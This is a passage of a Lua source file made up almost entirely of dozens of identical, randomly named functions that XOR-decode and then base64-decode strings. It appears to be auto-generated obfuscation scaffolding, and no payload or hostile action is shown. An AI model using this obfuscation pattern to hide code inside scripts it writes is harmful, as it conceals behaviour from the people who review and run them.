        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_vwjhpd(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bwoini(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_poxfdj(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_b_geej(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zyucnl(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_sviqlg(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rntznz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_htmqxt(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_kshzdw(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_usydkc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_l_r_fq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_scfv_s(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yrwdgn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ghdnnq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_gdpbdn(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__yrqke(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_phbmqc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ndpdfv(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_dpbikc(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bljsec(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_morqri(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_qdhswh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zk_bck(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_rirpyr(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_yohcsy(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_wvwoiz(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_txuhls(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ufwatp(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec__txep_(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_lvbmku(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zwsuja(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uclfoh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_zlqmav(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_bbvhyf(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_lzpclo(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_aipsas(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_ndjzgh(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local function b64decode(input)
        input = string.gsub(input, '[^'..b64chars..'=]', '')
        return (input:gsub('.', function(x)
            if (x == '=') then return '' end
            local r,f='',(b64chars:find(x)-1)
            for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if (#x ~= 8) then return '' end
            local c=0
            for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    return b64decode(decoded)
end

local function dec_uhywjq(data, k)
    local decoded = ""
    for i = 1, #data do
        decoded = decoded .. string.char(string.byte(data, i) ~ k)
    end
